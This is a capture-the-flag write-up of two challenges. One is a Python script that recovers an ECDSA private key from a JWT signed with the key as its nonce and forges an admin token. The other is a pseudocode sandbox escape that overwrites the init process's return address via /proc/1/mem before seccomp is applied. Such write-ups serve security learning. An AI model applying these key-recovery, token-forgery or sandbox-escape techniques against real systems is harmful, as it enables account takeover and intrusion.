### Practice Maple and Google Capture the Flag Writeup (Sandbox and Misc) - <3

[![GitHub Workflow Status](https://img.shields.io/github/actions/workflow/status/mathworks/jupyter-matlab-proxy/run-tests.yml?branch=main&logo=github)](https://www.mathworks.com) [![c++](https://img.shields.io/badge/C++-00599C?style=flat-square&logo=C%2B%2B&logoColor=white)](https://img.shields.io/badge/C++-00599C?style=flat-square&logo=C%2B%2B&logoColor=white)


### MapleIslandCTF (Crypto-JWT-JsonWebTokens) - Writeup <3
[![GitHub Workflow Status](https://img.shields.io/github/actions/workflow/status/mathworks/jupyter-matlab-proxy/run-tests.yml?branch=main&logo=github)](https://www.mathworks.com)[![python](https://img.shields.io/github/release/Envoy-VC/Python-Scripts.svg)](https://img.shields.io/badge/C++-00599C?style=flat-square&logo=C%2B%2B&logoColor=white) 


<img src="./img/maple-ctf-2023.png" width="800"/>


### Challenge Description:
<div style='text-align: justify;'>

<b> “Green grass breaks through snow. Artemis pleads for my help. I am so cool.” - Artemis Packet Tracer </b>

The name of the game is simple. It's love. They say opposites attract. You know like North and South, Hot and Cold, etc. The same is said to be true for parity too, the odd (the ones) and even DWORDS (the zeroes) have always had quite steamy and passionate relationships.

Historically speaking, tradition was paramount for this species. The zeroes scour the world in hopes of find their special One. (Where do you think the saying comes from? duh.) However, we are in the 21st century and must adapt to the new.

So, we made an entire reality TV show about it. The premise is simple: Screw tradition, in this show, only the Ones are allowed to court the zeroes.

Stay tuned for the most drama-filled season of Maple Island as of yet with even more tears, arguments, and passionate moments than ever before. Will every match made in Maple heaven be stable?

Maple Island streaming next month on MapleTV!

But wait, lucky viewers have a chance to catch exclusive early-access content if they can solve the following puzzle below and text the answer to 1-800-MAPLE-1337.

Author: hiswui

nc maple-island.ctf.maplebacon.org 1337

### Intended Solution:

After seeing the majority of JWT-based CTF challenges rely on vulnerabilities in HS256 and RS256 encryption, I am demonstrating the alternative asymmetric algorithms such as ECC can also be used for signatures and verification.
</div>

```py
class ES256:
    def __init__(self):
        self.G = secp256k1.G
        self.order = secp256k1.q
        self.private = private
        self.public = self.G * self.private

    def _sign(self, msg):
        z = sha256(msg.encode()).digest()
        k = self.private

        z = bl(z)

        r = (k * self.G).x
        s = inverse(k, self.order) * (z + r * self.private) % self.order

        return r, s

    def _verify(self, r, s, msg):
        if not (1 <= r < self.order and 1 <= s < self.order):
            return False

        z = sha256(msg.encode()).digest()
        z = bl(z)

        u1 = z * inverse(s, self.order) % self.order
        u2 = r * inverse(s, self.order) % self.order

        p = u1 * self.G + u2 * self.public

        return r == p.x

    # return true if the token signature matches the data
    def verify(self, data, signature):
        r = int.from_bytes(signature[:32], "little")
        s = int.from_bytes(signature[32:], "little")

        return self._verify(r, s, data)

    # return the signed message and update private/public
    def sign(self, data):
        ...

    # return the decoded token as a JSON object
    def decode(self, token):
        ...
```

The solution exploits the common mistake of ECDSA nonce reuse. In this case, the nonce is the same as the private key, meaning that an attacker can easily solve the ECDSA equation:

$$s = k^-1(z + rd)$$

$$s = d^-1(z + rd)$$

$$s - r = d^-1z$$

$$d = z/(s - r)$$


### Login with any Username and Copy the JWT Token:

```py
cookie = 'eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWJjZCJ9.75J83TiCMONIDtDLvDQ8FKHa4wx7DNHkauX-Izu11S-wAxbc4z_xrKKBMC3_IS3W0_8JQStEvZw2--CqrKCYig'

print(b64decode(cookie.split('.')[0]), b64decode(cookie.split('.')[1]))
signature = b64decode(cookie.split('.')[2])
r = int.from_bytes(signature[:32], "little")
s = int.from_bytes(signature[32:], "little")


G = secp256k1.G
order = secp256k1.q
msg = b'eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWJjZCJ9'
z = sha256(msg).digest()
z = bl(z)

# find the private key
private = inverse((s - r) * inverse(z, order), order)
print(private)


# forge a new token
from jwt import ES256
es = ES256(private)
print(es.sign({"user":"admin"}))
```

<b>Unintended!</b>

As per the <b> RFC for JWT </b>, the data to be signed should be stripped of all spaces. Unfortunately, I only removed these spaces after the user registered, meaning that they could create an account like:

```
username: ad  mi n
password: anything
```

Since the JWT implementation recognizes that username as `admin`, the token they received would be valid for a flag.

</br>
</br>


### Google Capture the Flag (Sandbox-Lightbox) - Writeup
[![GitHub Workflow Status](https://img.shields.io/github/actions/workflow/status/mathworks/jupyter-matlab-proxy/run-tests.yml?branch=main&logo=github)](https://www.mathworks.com)[![python](https://img.shields.io/github/release/Envoy-VC/Python-Scripts.svg)](https://img.shields.io/badge/C++-00599C?style=flat-square&logo=C%2B%2B&logoColor=white) 

<img src="./img/capture-the-flag.png" width="800"/>




### Challenge Description:

“Green grass breaks through snow. Artemis pleads for my help. I am so cool.” - Artemis Packet Tracer

In this challenge we can execute an arbitrary payload in a custom seccomp +
namespace sandbox.

The flag is also written to a System V shared memory segment (with the
key=0xf7a6). Bypassing seccomp restrictions is enough to read the flag, as IPC
namespace is not used.

### Intended Solution:

Namespaces are set up as the first step of creating the sandbox. Mount namespace
is almost empty with just a fresh "/proc" instance.

After that process is forked again into an init process and a sandboxee process.

Sandboxee process:

1.  applies a tight seccomp policy (open/read/write/lseek/exit)
2.  runs our payload

Init process:

1.  iterates over fd = 0..4096 and closes them
2.  applies a tight seccomp policy (waitid/exit)
3.  waits for the child (sandboxee) process

We can notice that there is no other synchronization between sandboxee and init
except of the waitid. So our payload might get to run before init process
applies its seccomp policy. If we take over init process before seccomp policy
is applied, we get code execution without syscall filtering.

Getting RIP control in init is easy by just overwriting the return address of
CloseFds in /proc/1/mem. We don't really need to guess/read the stack address as
the processes are just forked, so we can calculate it from the stack pointer we
have in the payload. Helpfully our payload is also mapped before the fork so no
need for a ROP chain, we can jump straight into some part of the payload for the
second stage. By getting code exec early in the init process we can bypass
seccomp restriction and thus read the flag.

Remaining problem is that the stdout will likely already be closed, so we either
have to pull the read flag into sandboxee process by means of /proc/1/mem or
just recreate stdout in init process using pidfd_open/pidfd_getfd.

### Solution Exploit in Pseudocode:

```c++
stage1:
   // launch stage2 in init process before it applies seccomp
   fd = open("/proc/1/mem", O_RDWR)
   stage2_addr = &stage2
   write(fd, stage2_addr, &$RSP[return_address_offset])
   exit(0)
stage2:
   // recreate stdout
   pidfd = pidfd_open(2, 0)
   stdout = pidfd_getfd(pidfd, 1, 0)
   // read the flag
   shmid = shmget(0xf7a6, 128, 0)
   flag = shmat(shmid, 0, 0)
   write(stdout, flag, 128)
   exit(0)
```
![Screenshot 2024-02-18 155810](https://github.com/Eevalice/practice-google-ctf-2023-problems/assets/79138019/41a241f3-9a6e-42a7-980f-283dab822851)

</br>
</br>


